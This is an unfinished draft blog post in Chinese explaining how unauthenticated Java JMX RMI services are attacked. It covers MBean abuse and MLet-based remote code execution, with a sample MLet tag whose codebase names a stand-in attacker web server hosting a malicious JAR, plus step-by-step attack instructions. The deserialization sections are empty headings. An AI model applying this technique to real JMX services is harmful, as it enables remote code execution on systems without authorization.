---
title: "Java JMXRMI服务的攻击与利用"
date: 2020-04-25T16:54:21+08:00
categories: [Security]
tags: [Java]
draft: true
---

## JMXRMI介绍

Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX最常见的应用场景，就是在Nagios、Icinga或Zabbix等集中式监控解决方案中用于监控Java应用服务器的可用性和性能。

JMX不仅能够从远程系统读取值，还可以用于调用远程系统上的方法。利用JMX，我们可以像托管bean一样来管理各种资源。托管bean（MBean）是遵循JMX标准的某些设计规则的Java Bean类。MBean可以表示设备、应用程序或需要通过JMX管理的任何资源。可以通过JMX来访问这些MBean，比如查询属性和调用Bean方法。

如果我们想要连接运行在另一台服务器上的远程实例，则必须使用JMX连接器。JMX连接器实际上就是客户端/服务器的stub对象，用于提供对远程MBean服务器的访问。这是通过经典的RPC（远程过程调用）方法实现的，旨在让开发人员可以透明地访问“远程”部件，包括用于与远程实例通信的协议。默认情况下，Java会提供基于Java RMI（远程方法调用）的远程JMX连接器。

## JMX服务的攻击方式

### Abuse MBean

如前介绍，JMX服务中可能由开发者部署了多个MBean，这些MBean的功能由开发者自行定义，如果没有授权认证，可以通过JConsole直接连接，并调用远程的MBean方法，这可能会暴露一些敏感的接口或信息。

### 基于MLet的远程代码执行攻击

2013年，Braden Thomas在"[Exploiting JMX RMI](https://www.optiv.com/blog/exploiting-jmx-rmi)"一文中首次描述了这种攻击技术。实现远程代码执行的条件是未启用JMX的认证。

MLet（management applet）可以用来通过远程URL在MBean服务器中注册一个或多个MBean。恶意的远程客户端可以创建javax.management.loading.MLet MBean，并使用它通过任意URL创建新的MBean。MLET是一个类似于HTML的文件，可以通过Web服务器提供。MLet的示例如下：

```html
<html><mletcode="de.mogwailabs.MaliciousMLet" archive="mogwailabsmlet.jar" name="Mogwailabs:name=payload" codebase="http://attackerwebserver"></mlet></html>
```

攻击者可以托管这样的MLet文件，并指示JMX服务从远程主机加载MBean。攻击过程如下所示：

1. 启动托管MLet和含有恶意MBean的JAR文件的Web服务器
2. 使用JMX在目标服务器上创建MBean javax.management.loading.MLet的实例
3. 调用MLet实例的“getMBeansFromURL”方法，将Web服务器URL作为参数进行传递。JMX服务将连接到Web服务器请求MLet文件并解析
5. JMX服务下载并归档MLet文件中引用的JAR文件，使恶意MBean可通过JMX获取
5. 攻击者最终调用来自恶意MBean的方法

> 有认证则无法调用`getMBeansFromURL`？



https://github.com/mogwailabs/mjet

### 反序列化漏洞

#### CVE-2016-3427



#### 攻击RMI协议



#### JMX/MBean级别的反序列化漏洞





---

参考资料：

[如何入侵基于RMI的JMX服务](https://nosec.org/home/detail/2544.html)

[Exploiting JMX RMI - Braden Thomas](https://www.optiv.com/blog/exploiting-jmx-rmi)